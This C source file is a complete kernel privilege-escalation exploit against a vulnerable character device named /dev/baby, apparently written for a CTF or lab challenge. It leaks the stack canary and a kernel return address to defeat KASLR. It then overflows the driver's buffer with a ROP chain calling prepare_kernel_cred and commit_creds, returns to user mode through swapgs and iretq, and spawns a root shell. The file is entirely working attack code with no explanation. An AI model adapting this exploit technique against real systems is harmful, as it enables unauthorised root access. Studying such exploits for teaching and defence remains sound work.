#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *VULN_DRV = "/dev/baby";
void spawn_shell();

int64_t global_fd = 0;
uint64_t cookie = 0;
uint8_t cookie_off = 50;

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred = 0xffffffff810861d0;
uint64_t commit_creds = 0xffffffff81085fa0;
uint64_t user_rip = (uint64_t) spawn_shell;
uint64_t kernel_base = 0xffffffff81000000;
int64_t kernel_base_offset = 0;
uint64_t pop_rdi_ret = 0xffffffff8100279a;
uint64_t mov_rdi_rax_clobber_rsi140_pop1_ret = 0xffffffff810ee108;
uint64_t swapgs_pop1_ret = 0xffffffff81c00f0a;
uint64_t iretq = 0xffffffff810003dc;

void open_dev() {
  global_fd = open(VULN_DRV, O_RDWR);
  if (global_fd < 0) {
    printf("[-] failed to open %s\n", VULN_DRV);
    exit(-1);
  } else {
    printf("[+] successfully opened %s\n", VULN_DRV);
  }
}

void close_device(void) {
    if(close(global_fd) == -1) {
        puts("[!] Error closing the device");
        exit(-1);
    }
    puts("[+] Device closed");
}

void leak_cookie_and_kernel_offset() {
  uint8_t sz = 70;
  uint64_t leak[sz];
  printf("[*] trying to leak up to %ld bytes memory\n", sizeof(leak));
  uint64_t data = read(global_fd, leak, sizeof(leak));
  cookie = leak[cookie_off];
  printf("[+] found stack canary: 0x%lx @ index %d\n", cookie, cookie_off);
//   for (int i=0;i<=70;i++){
// 	printf("[+]: 0x%lx @ index %d\n", leak[i], i);
//   }
  if (!cookie) {
    puts("[-] failed to leak stack canary!");
    exit(-1);
  }
  printf("[+] Original return address: 0x%lx\n", leak[51]);
  kernel_base_offset = leak[51] - 0x1ca727 - kernel_base;
//   kernel_base_offset = (leak[65] & 0xffffffffffff0000) - kernel_base;
  printf("[+] got kernel base address offset: 0x%lx\n", kernel_base_offset);
}

void save_userland_state() {
  puts("[*] saving user land state");
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
}

void spawn_shell() {
  puts("[+] returned to user land");
//   uid_t uid = getuid();
//   if (uid == 0) {
//     printf("[+] got root (uid = %d)\n", uid);
//   } else {
//     printf("[!] failed to get root (uid: %d)\n", uid);
//     exit(-1);
//   }
  char *args[] = {"/bin/sh", "-i", NULL};
  execve("/bin/sh", args, NULL);
  close_device();
  exit(0);
}

void privesc() {
    __asm__(".intel_syntax noprefix;"
            "movabs rax, prepare_kernel_cred;"
			"add rax,kernel_base_offset;"
            "xor rdi, rdi;"
            "call rax;"
            "mov rdi, rax;"
            "movabs rax, commit_creds;"
			"add rax,kernel_base_offset;"
            "call rax;"
            "swapgs;"
            "mov r15, user_ss;"
            "push r15;"
            "mov r15, user_sp;"
            "push r15;"
            "mov r15, user_rflags;"
            "push r15;"
            "mov r15, user_cs;"
            "push r15;"
            "mov r15, user_rip;"
            "push r15;"
            "iretq;"
            ".att_syntax;");
}



void overwrite_ret() {
  uint8_t sz = 64;
  uint64_t payload[sz];

  payload[cookie_off++] = cookie;
//   payload[cookie_off++] = (uint64_t) privesc;
  payload[cookie_off++] = pop_rdi_ret + kernel_base_offset;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = prepare_kernel_cred + kernel_base_offset;
  payload[cookie_off++] = mov_rdi_rax_clobber_rsi140_pop1_ret + kernel_base_offset;
  // payload[cookie_off++] = 0x0;
  payload[cookie_off++] = commit_creds + kernel_base_offset;
  payload[cookie_off++] = swapgs_pop1_ret + kernel_base_offset;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = iretq + kernel_base_offset;
  payload[cookie_off++] = user_rip;
  payload[cookie_off++] = user_cs;
  payload[cookie_off++] = user_rflags;
  payload[cookie_off++] = user_sp;
  payload[cookie_off++] = user_ss;

  uint64_t data = write(global_fd, payload, sizeof(payload));
}

int main(int argc, char **argv) {
  open_dev();
  save_userland_state();
  leak_cookie_and_kernel_offset();
  overwrite_ret();

  return 0;
}